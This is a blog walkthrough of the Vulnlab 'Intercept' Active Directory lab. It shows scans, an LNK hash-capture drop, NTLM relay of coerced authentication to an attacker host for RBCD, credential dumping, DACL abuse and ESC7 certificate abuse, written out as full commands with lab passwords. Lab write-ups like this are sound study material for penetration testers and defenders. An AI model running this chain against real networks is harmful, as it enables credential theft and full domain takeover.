---
layout: post
title: Intercept
subtitle: Vulnlab writeup
thumbnail-img: https://assets.vulnlab.com/intercept_slide.png
share-img: https://assets.vulnlab.com/intercept_slide.png
tags: [Pentesting, Active Directory, Vulnlab]
---

# Introduction

Intercept is a hard difficulty rated Active Directory chain on the Vulnlab platform. The Intercept lab involves a chain of realistic Active Directory focused attack vectors against two individual machines: DC01, and WS01. This blog post will provide a walkthrough of the various steps of exploitation for this lab environment, screenshots, commands required, and accompanying explanations of the process. Some of the various attack vectors present in the chain include coercing HTTP authentication through Webclient into an NTLM LDAP relay attack, Active Directory Discretionary Access Control Lists (DACL) abuse, and Active Directory Certificate Services (ADCS) exploitation

# Enumeration 

## DC01

From an nmap scan of DC01 we can confirm that it is in fact a domain controller. All the output is very standard, nothing particularly out of the ordinary.

```
Nmap scan report for dc01 (10.10.158.197)
Host is up (0.14s latency).
rDNS record for 10.10.158.197: dc01.intercept.vl

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-29 21:06:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2024-06-29T21:08:08+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.intercept.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.intercept.vl
| Not valid before: 2023-06-27T13:28:30
|_Not valid after:  2024-06-26T13:28:30
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2024-06-29T21:08:08+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.intercept.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.intercept.vl
| Not valid before: 2023-06-27T13:28:30
|_Not valid after:  2024-06-26T13:28:30
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2024-06-29T21:08:08+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.intercept.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.intercept.vl
| Not valid before: 2023-06-27T13:28:30
|_Not valid after:  2024-06-26T13:28:30
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2024-06-29T21:08:08+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.intercept.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.intercept.vl
| Not valid before: 2023-06-27T13:28:30
|_Not valid after:  2024-06-26T13:28:30
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.intercept.vl
| Not valid before: 2024-06-28T20:51:53
|_Not valid after:  2024-12-28T20:51:53
| rdp-ntlm-info: 
|   Target_Name: INTERCEPT
|   NetBIOS_Domain_Name: INTERCEPT
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: intercept.vl
|   DNS_Computer_Name: DC01.intercept.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-06-29T21:07:28+00:00
|_ssl-date: 2024-06-29T21:08:08+00:00; +1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-06-29T21:07:30
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

## WS01

Nothing too crazy right off the bat for WS01 either, the only thing we really gather from this scan is that we could access the target through RDP or WinRM if we gather valid credentials.

```
Nmap scan report for ws01 (10.10.158.198)
Host is up (0.14s latency).
rDNS record for 10.10.158.198: ws01.intercept.vl

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-06-29T21:19:10+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WS01.intercept.vl
| Not valid before: 2024-06-28T20:52:01
|_Not valid after:  2024-12-28T20:52:01
| rdp-ntlm-info: 
|   Target_Name: INTERCEPT
|   NetBIOS_Domain_Name: INTERCEPT
|   NetBIOS_Computer_Name: WS01
|   DNS_Domain_Name: intercept.vl
|   DNS_Computer_Name: WS01.intercept.vl
|   DNS_Tree_Name: intercept.vl
|   Product_Version: 10.0.19041
|_  System_Time: 2024-06-29T21:18:30+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-06-29T21:18:30
|_  start_date: N/A
```

# SMB Enumeration (Uncredentialed)

SMB is easily one of the most important services to test in an Active Directory environment, so I immediately started testing for SMB null bindings on all devices.

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/26b9a8dd-7b62-4560-ac3e-42e1a2ddd961)

# Auth Capture Via LNK File

Immediately it strikes me that the `dev` share is writeable with a null bind or anonymous session. There's a few things we could do with writeable shares, one of the main things that came to mind was dropping a malicious LNK file on the share, so whenever a user reads the directory in file explorer we're able to capture the users NTLM authentication automatically. We can use the `slinky` module on Netexec for this.

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/0f983ea6-349a-4a3d-884a-ce34fc9b9bca)

When we open responder with `responder -I tun0 -v` to listen for authentication attempts, we successfully receive NTLM authentication from `Kathryn.Spencer`.

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/cffe7d74-00b9-4201-a774-af9eb9df21a9)

Immediately I attempted to crack the NetNTLMv2 hash using hashcat, and was successful. Kathryn's password is `Chocolate1`.

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/3cb00f9b-b22e-49da-9676-9e7b7cbd3288)

# Credentialed Domain Enumeration

Now that we've furthered our access through some domain user credentials, we can start digging deeper. For example, something I always love to check when gathering domain user credentials is the domains Active Directory Certificate Services (ADCS) configuration. Running certipy shows us a CA does exist on the domain, but nothing is picked up as vulnerable yet.

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/e9c9bc84-9881-4be2-9f60-01cd7e0bd51b)

Next I started looking into DC misconfigurations, and I often run the `ldap-checker` Netexec module just because not having LDAP signing on the domain controller can be devastating. In this case, that's exactly what I find! LDAP signing is not enforced! This means if a few parameters are met we can preform a full takeover of a domain computer through an LDAP relay attack.

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/053bd541-3135-412b-bad9-1c5cb93af8d8)

These paramters are:
1. LDAP signing is not enforced (as mentioned)
2. Webclient is currently running on the target device
3. We have an SPN to use for RBCD, or the MAQ isn't 0

# NTLM Relay to the LDAP Service

So what does this mean? Well, the Webclient service allows us to remotely coerce HTTP authentication from a domain computer. We require HTTP authentication because an SMB to LDAP relay doesn't work because of the MIC (Message Integrity Check). We also need a SPN (Service Principal Name), as apart of the RBCD (Resource-Based Constrained Delegation) attack because after we write the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the target object from the relay, a SPN has to be available to delegate to the target device. This can also be a domain computer since domain computers are automatically created as SPN's, and if the MAQ (Machine Account Quota) is greater than zero we can just create our own SPN for the attack.


Luckily there's some Netexec modules to check those last two parameters. The `maq` and `webdav` modules.


The MAQ is 10, as the default value, and Webclient is enabled on WS01! This meets all our parameters for exploitation!

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/79207af3-fdcd-45bb-bc8a-78338a9d74c8)

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/f3f9e4cf-103a-425e-8d1e-b4ef324bead5)

The only thing left to do is ensure that the HTTP authentication can reach our attacker host. Normally this wouldn't be an issue, but the Webclient connection string is required to be a hostname instead of an IP address. This means we'll have to add a DNS entry to the domain, which is a default permission for all domain users.


We can do this with `dnstool.py`, we'll add a new DNS entry of `attacker.intercept.vl` and it'll point to my attacker host.
```
python3 /opt/krbrelayx/dnstool.py -u intercept.vl\\kathryn.spencer -p 'Chocolate1' -r attacker.intercept.vl -a add -d 10.8.2.129 10.10.134.69
```

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/4f234c27-f44b-4090-a72a-e2e68a2a5526)

Next we can set up the actual LDAP relay with `ntlmrelayx.py`, and add the `--delegate-access` flag to ensure that msDS-AllowedToActOnBehalfOfOtherIdentity gets written on WS01.

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/164b418c-a76c-448f-91da-6e46c075e1e3)

Finally, we can use PetitPotam to coerce Webclient HTTP authentication
```
python3 /opt/PetitPotam/PetitPotam.py -u kathryn.spencer -p 'Chocolate1' -d intercept.vl attacker@80/aaa 10.10.134.70
```

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/e12f6f54-7ab6-4aec-9a5c-2177a1384c4b)

The LDAP relay was successful! And `ntlmrelayx.py` gave as a machine account to use to delegate to WS01!

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/7c13cbe9-0e10-4623-92aa-00eb37a87530)

Now we can request a service ticket using S4U2Proxy and the machine accounts credentials!
```
getST.py -spn 'cifs/ws01.intercept.vl' -impersonate Administrator -dc-ip '10.10.134.69' 'intercept.vl/ZTVBFECA$'
```

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/84652cb4-c8c6-469d-b262-d09baf622b1d)

Then finally we can test authentication to WS01 using the ticket we've received.
```
KRB5CCNAME=Administrator.ccache netexec smb ws01 --use-kcache
```

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/543c832f-fdca-4771-9812-1034f08452df)

# WS01 Post Exploitation

When dumping credentials with the `--lsa` flag, I found `Simon.Bowen`'s credentials. 

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/aa9ea902-f22b-475d-be7f-fe1c8c47bd32)

# Active Directory DACL Abuse Into ESC7 Exploitation

After re-running bloodhound with Simon's access, I came across an interesting relationship between some of the objects. Simon is in the Helpdesk group, which has GenericAll over a group called `ca-managers`. If this group has a purpose descriptive name, then it looks like we have a path to DA (Domain Admin)

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/0bf92b68-10aa-448b-9981-befe506bbd71)

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/d15e766e-1c5a-44c4-a843-a10f96ad7287)
 
Lets look at the CA configuration just to make sure this `ca-managers` group can actually manage the CA. Running `certipy` again shows that this is indeed the case!

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/88b0dab7-0feb-4f15-87dc-da6628ed7fab)

Because of the DACL relationship, we can add Simon to the `ca-managers` group with:
```
net rpc group addmem "ca-managers" "Simon.Bowen" -U "INTERCEPT"/"Simon.Bowen"%"b0OI_fHO859+Aw" -S "10.10.239.5"
```

Now that Simon is in the `ca-managers` group, all we'll need to do is exploit ESC7, which is also outlined on another one of my blog posts [here](https://logan-goins.com/2024-05-04-ADCS/#exploitation-of-esc7).
As mentioned in my previous blog post, because we manage the CA, we can add ourselves as an officer, which will allow us to approve our own certificate requests, including certificate requests that allow us to impersonate the DA.

```
certipy ca -ca 'intercept-DC01-CA' -add-officer Simon.Bowen -username Simon.Bowen -password 'b0OI_fHO859+Aw' -dc-ip 10.10.239.5
```

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/f0151864-369a-4785-904d-7162263e03c7)

Next enable the configured by default SubCA certificate template, this template is useful because it allows client authentication by default, allowing us to authenticate as DA using the requested certificate.
```
certipy ca -ca 'intercept-DC01-CA' -enable-template "SubCA" -username Simon.Bowen -password 'b0OI_fHO859+Aw' -dc-ip 10.10.239.5
```

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/65acfde5-5435-4cc1-ab46-f7228ffa4fbc)

Now we request a certificate with the userPrincipalName of Administrator, the request will get automatically denied, but since Simon is an officer we can manually issue the requested certificate.
```
certipy req -ca 'intercept-DC01-CA' -username Simon.Bowen -password 'b0OI_fHO859+Aw' -target 10.10.239.5 -template SubCA -upn administrator@intercept.vl
```

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/88f201d9-8215-48f7-aa31-12c6d41e7c88)

Then manually issue the certificate request
```
certipy ca -ca 'intercept-DC01-CA' -issue-request 5 -username Simon.Bowen -password 'b0OI_fHO859+Aw' -dc-ip 10.10.239.5
```

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/e1b6ca13-1625-4170-af31-6b2c3be24eb4)

Finally retrieve the requested certificate
```
certipy req -ca 'intercept-DC01-CA' -username Simon.Bowen -password 'b0OI_fHO859+Aw' -target 10.10.239.5 -retrieve 5
```

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/c3e5ff80-881b-4d02-ab95-e530c3137882)

Now we can use certipy auth to gain the NTLM hash from the Domain Admin from the requested certificate.
```
certipy auth -pfx administrator.pfx
```

![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/103a1370-2007-4c76-9c8a-24aaa9e1a6be)

And finally when testing credentials, they work! And we're DA.
![image](https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/358dc85d-5d32-459f-9aa6-65e3dd1de3f8)

